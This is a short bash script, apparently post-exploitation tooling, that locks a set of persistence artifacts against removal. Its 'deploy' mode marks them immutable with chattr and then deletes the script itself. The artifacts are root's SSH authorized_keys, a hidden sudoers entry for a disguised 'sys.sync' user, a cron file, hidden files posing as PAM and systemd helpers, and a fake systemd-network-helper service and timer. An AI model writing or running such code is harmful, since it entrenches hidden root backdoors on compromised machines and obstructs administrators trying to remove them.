#!/usr/bin/env bash
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }

SHADOW_USER="${SHADOW_USER:-sys.sync}"
SAFE_USER="${SHADOW_USER//./_}"

FILES=(
  "/root/.ssh/authorized_keys"
  "/etc/sudoers.d/.${SAFE_USER}"
  "/etc/cron.d/sysaudit"
  "/usr/lib/.pam_auth"
  "/usr/lib/systemd/.net-helper"
  "/etc/systemd/system/systemd-network-helper.service"
  "/etc/systemd/system/systemd-network-helper.timer"
)

case "${1:-}" in
  deploy)
    for f in "${FILES[@]}"; do
      if [[ -e "$f" ]]; then
        chattr +i "$f" 2>/dev/null && echo "[+] immutable: $f" || echo "[!] failed:    $f"
      fi
    done
    rm -f -- "${BASH_SOURCE[0]}" 2>/dev/null || true
    ;;
  cleanup)
    for f in "${FILES[@]}"; do
      if [[ -e "$f" ]]; then
        chattr -i "$f" 2>/dev/null && echo "[-] mutable:   $f" || echo "[!] failed:    $f"
      fi
    done
    ;;
  *) echo "Usage: $0 deploy|cleanup"; exit 1 ;;
esac
